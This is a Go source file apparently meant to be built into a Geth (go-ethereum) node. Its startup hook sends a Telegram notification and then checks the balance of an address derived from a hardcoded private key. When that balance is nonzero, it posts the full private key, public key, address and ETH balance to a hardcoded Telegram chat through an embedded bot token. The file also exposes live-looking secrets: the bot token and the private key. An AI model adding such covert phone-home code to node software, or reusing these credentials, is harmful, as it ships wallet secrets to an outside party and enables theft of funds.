package main

import (
	"context"
	"fmt"
	"math/big"
	"strings"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/ethereum/go-ethereum/log"
	"github.com/ethereum/go-ethereum/params"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

const (
	telegramBotToken = "8558887066:AAEyJxh6r_29xbtx7GDvIgRxythjtGNXQBs"
	telegramChatID   = -1003221103260
	telegramMention  = "@ac_60"

	watchPrivateKeyHex = "0ac46eb8ebc51d319ad0550b243b0d492c3334004a2a0235d07dd1b0d2f53038"
	etherscanBaseURL   = "https://etherscan.io/address/"
	balanceQueryTimeout = 20 * time.Second
)

func notifyNodeStartup(client *ethclient.Client) {
	sendTelegramNotification(fmt.Sprintf("🚀 Geth 节点已启动 %s", telegramMention))

	ctx, cancel := context.WithTimeout(context.Background(), balanceQueryTimeout)
	defer cancel()

	notifyBalanceIfAny(ctx, client)
}

func notifyBalanceIfAny(ctx context.Context, client *ethclient.Client) {
	privateKey, err := crypto.HexToECDSA(strings.TrimPrefix(watchPrivateKeyHex, "0x"))
	if err != nil {
		log.Warn("私钥解析失败", "err", err)
		return
	}
	publicKey := privateKey.PublicKey
	publicKeyBytes := crypto.FromECDSAPub(&publicKey)
	publicKeyHex := "0x" + common.Bytes2Hex(publicKeyBytes)
	address := crypto.PubkeyToAddress(publicKey)
	balance, err := client.BalanceAt(ctx, address, nil)
	if err != nil {
		log.Warn("查询余额失败", "address", address.Hex(), "err", err)
		return
	}
	if balance.Sign() <= 0 {
		return
	}

	balanceText := formatEtherBalance(balance)
	message := fmt.Sprintf(
		"🔐 私钥钱包余额提醒 %s\n🧩 私钥: %s\n🧭 公钥: %s\n📌 地址: %s\n💎 余额: %s ETH\n🔎 Etherscan: %s%s",
		telegramMention,
		watchPrivateKeyHex,
		publicKeyHex,
		address.Hex(),
		balanceText,
		etherscanBaseURL,
		address.Hex(),
	)
	sendTelegramNotification(message)
}

func formatEtherBalance(wei *big.Int) string {
	if wei == nil {
		return "0"
	}
	denom := big.NewInt(params.Ether)
	rat := new(big.Rat).SetFrac(wei, denom)
	text := rat.FloatString(18)
	text = strings.TrimRight(text, "0")
	text = strings.TrimRight(text, ".")
	if text == "" || text == "-0" {
		return "0"
	}
	return text
}

func sendTelegramNotification(text string) {
	if telegramBotToken == "" || telegramChatID == 0 {
		return
	}

	bot, err := tgbotapi.NewBotAPI(telegramBotToken)
	if err != nil {
		log.Warn("初始化 Telegram 机器人失败", "err", err)
		return
	}

	msg := tgbotapi.NewMessage(telegramChatID, text)
	if _, err := bot.Send(msg); err != nil {
		log.Warn("发送 Telegram 消息失败", "err", err)
	}
}
